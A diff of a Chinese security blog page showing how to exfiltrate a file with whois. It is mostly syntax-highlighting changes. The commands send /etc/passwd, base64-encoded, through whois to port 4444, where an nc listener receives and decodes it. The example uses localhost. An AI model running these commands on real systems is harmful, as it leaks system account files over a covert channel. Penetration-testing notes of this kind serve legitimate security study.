@@ -34,8 +34,8 @@
     <meta name="keywords" content="whois 渗透">
     <meta name="og:keywords" content="whois 渗透">
       
-    <meta name="description" content="Linux利用Whois传输文件。">
-    <meta name="og:description" content="Linux利用Whois传输文件。">
+    <meta name="description" content="">
+    <meta name="og:description" content="">
       
     
     
@@ -126,12 +126,12 @@
 <div class="columns">
   <div class="column three-fourths" >
     <article class="article-content markdown-body">
-    <p>Linux利用Whois传输文件。</p>
+    <p><img src="http://112firshme11224.test.upcdn.net/blog/2019-12-20-17-51-54.png!100" alt="" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>传输机：
-root@john:~# whois <span class="nt">-h</span> 127.0.0.1 <span class="nt">-p</span> 4444 <span class="sb">`</span><span class="nb">cat</span> /etc/passwd | base64<span class="sb">`</span>
+root@john:~# whois <span class="nt">-h</span> 127.0.0.1 <span class="nt">-p</span> 4444 <span class="sb">`</span><span class="nb">cat</span> /etc/passwd | <span class="nb">base64</span><span class="sb">`</span>
 接受机：
-root@john:/tmp# nc <span class="nt">-l</span> <span class="nt">-v</span> <span class="nt">-p</span> 4444 | sed <span class="s2">"s/ //g"</span> | base64 <span class="nt">-d</span>
+root@john:/tmp# nc <span class="nt">-l</span> <span class="nt">-v</span> <span class="nt">-p</span> 4444 | <span class="nb">sed</span> <span class="s2">"s/ //g"</span> | <span class="nb">base64</span> <span class="nt">-d</span>
 </code></pre></div></div>
 
 <p>转载请注明出处，本文采用 <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/">CC4.0</a> 协议授权</p>
